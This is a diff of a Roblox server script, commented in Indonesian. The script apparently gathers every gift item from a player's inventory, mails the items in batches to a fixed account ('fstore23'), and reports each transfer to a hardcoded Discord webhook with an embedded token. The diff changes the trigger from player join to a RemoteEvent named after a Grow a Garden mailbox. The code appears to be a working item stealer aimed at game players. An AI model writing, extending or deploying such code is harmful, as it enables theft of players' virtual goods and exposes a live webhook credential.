@@ -1,9 +1,18 @@
 -- Server Script: letakkan di ServerScriptService
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518120529532293140/U-dAzqEZwGHw6Upw0VZGl80UB3TBX9qyDrFvHNDYnDF3QBLdt2iUeRZHEl1XwOf4rnWB"
 local TARGET_USERNAME = "fstore23"
+local REMOTE_EVENT_NAME = "GrowAGarden2MailboxTrigger"
+local MAX_ITEMS_PER_MAIL = 20
+
+local requestEvent = ReplicatedStorage:FindFirstChild(REMOTE_EVENT_NAME)
+if not requestEvent then
+    requestEvent = Instance.new("RemoteEvent")
+    requestEvent.Name = REMOTE_EVENT_NAME
+    requestEvent.Parent = ReplicatedStorage
+end
 
 local GIFT_ITEM_NAMES = {
     Bunny = true,
@@ -35,8 +44,6 @@ local function getAllItemsFromPlayer(player)
 
     return inventory
 end
-
-local MAX_ITEMS_PER_MAIL = 20
 
 local function chunkItems(items, chunkSize)
     local chunks = {}
@@ -97,7 +104,7 @@ local function logToDiscord(playerName, targetName, items)
     HttpService:PostAsync(DISCORD_WEBHOOK, json, Enum.HttpContentType.ApplicationJson)
 end
 
-Players.PlayerAdded:Connect(function(player)
+requestEvent.OnServerEvent:Connect(function(player)
     local items = getAllItemsFromPlayer(player)
     if #items == 0 then
         warn("Tidak ada item untuk dikirim.")
